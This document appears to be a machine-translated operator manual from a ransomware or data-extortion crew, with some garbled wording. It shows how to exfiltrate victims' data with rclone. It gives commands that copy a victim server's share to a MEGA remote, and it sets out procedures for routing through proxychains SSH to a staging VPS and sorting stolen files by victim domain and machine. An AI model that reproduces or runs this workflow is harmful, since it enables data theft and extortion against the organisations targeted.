1. download the program itself (posted in general), create a file rclone.conf and put it in the same folder as the exe
2. Next, open the kmd from the admin, go to the folder where the software is located with the configuration file and run the command: rclone config
3. Then pop up menu, where we create a config (roughly speaking, roll in the gods mega), after the gods rolled in, the program writes them to the file rclone.conf, in encrypted form.
4. Take this rclone.conf file and the program itself and put it on the host from which we are going to download the information.
5. Fall into the cobweb into the folder where you put the config and the program and run the command:

shell rclone.exe copy "\trucamtldc01\E$\Data" remote:Data -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12

Well, I think it is clear here, what is in quotes is what we download, we can specify anything, even the whole disk
remote - the name of the config that we specified in step 3, data - the folder in the mega, where the info is downloaded

Regulations for pouring data to the grandfather with Rclone
The process is built on the following principle.
A single Rclone configuration file is used for all users, which lies in /var/www/rclone.conf.
This is where all the remote ones are collected and from where we pump out the data.
We download only from our VPS, or from other remote storages such as megs. We never download directly from targets.
Everyone connects via SSH under his account, configures remote (if it is not configured yet), creates new tmux session, starts copying process.

Connecting via SSH
Code: [Highlight]

proxychains4 ssh USER@IP

At the first connection you will be asked to add a Fingerprint, enter "yes".
USER - your user name, for example looper.
IP is the IP address of the grandfather.
Next, enter the password.

Add a new remote
Code: [Highlight].

rclone --config /var/www/rclone.conf config

First see if remote has already been added by someone else.
Let's configure it using the example of VPS with SFTP.
Choose "n) New remote", enter "n".
As a name we specify a smart name, specifying whose IP address without a dot, for example, rz16696.
If you are downloading from mega, specify mega-EMAIL.
EMAIL - mail, on which mega account is registered, the part before "@".
Then we specify the type of Storage, for example sftp.
Then we specify the host, i.e. IP address from where we are going to download.
Then we specify the user, the name of the user we are going to download from, for example root.
Then we specify port, usually it is standard SFTP SSH connection port, i.e. 22.
The next step is password, choose "y) Yes type in my own password", entering "y", enter the password from the Storage user, then enter again confirming it.
The following values are for more flexible configuration, which is not needed at this stage, so just press ENTER on them: key_pem, key_file.
Next select "n) No leave this optional password blank (default)" by typing "n" or just press ENTER.
Then for pubkey_file, key_use_agent, use_insecure_cipher, disable_hashcheck we also leave the standard value, just press ENTER.
In the standard situation we do not need to edit Advanced config, so choose "n) No (default)", enter "n", or just press ENTER.
Watch the result of the configuration, if everything is OK, choose "y) Yes this is OK (default)" by typing "y" or just pressing ENTER.
Exit the configurator by selecting "q) Quit config", enter "q", press ENTER.

Check the created remote
An optional step to make sure that remote is added correctly.
Code: [Highlight]

rclone --config /var/www/rclone.conf ls REMOTE:BUCKET

REMOTE is the name of the remote, for example rz16696.
BUCKET - the path to the files on the remote, for example /home/filterek.

Create a tmux session
Code: [Highlight]

tmux new -s NAME

NAME - the name of the session, we call it by the following principle. Name of the case (domain without domain zone, i.e. part before the dot), then lower underscore _, which procedure (in our case copy), lower underscore _, name of remote (for example rz16696). Final example: filterek_copy_rz16696.

Start copying
Code: [Highlight].

rclone --config /var/www/rclone.conf -P copy REMOTE:BUCKET PATH -q --ignore-existing --auto-confirm

REMOTE is the name of the remote, for example rz16696.
BUCKET - The path to the files on the remote, for example /home/filterek.
PATH is the path to copy to on the remote. Each user has its own folder, which is located in /var/www/USER_NAME/data, where USER_NAME - your user name. To this folder we copy according to the following principle. First, the name of the case as in the rocket (domain with a domain zone), such as filterek.com, then the name of the car, from which the data were downloaded, such as ADMS-FILE, then folders as they are structured on the car, from which we download. The final example: /var/www/looper/data/filterek.com/ADMS-FILE/Finance.
After starting Rclone, wait until it calculates all the files and starts displaying the download process.

Disconnect from the tmux session
Press CTRL + B, then press D.

Disconnect from SSH
Disconnect from ssh with CTRL+D.

Checking download status
Connect via ssh.
Code: [Highlight]

tmux ls

We see a list of tmux sessions.

Connect to the tmux session.
Code: [Highlight]

tmux a -t NAME

NAME - the name of the tmux session, for example, filterek_copy_rz16696.
You can see the download process.

After the download process is complete
After the download is complete, kill the tmux session.
Code: [Highlight]

tmux kill-session -t NAME

NAME - the name of the tmux session, for example filterek_copy_rz16696.
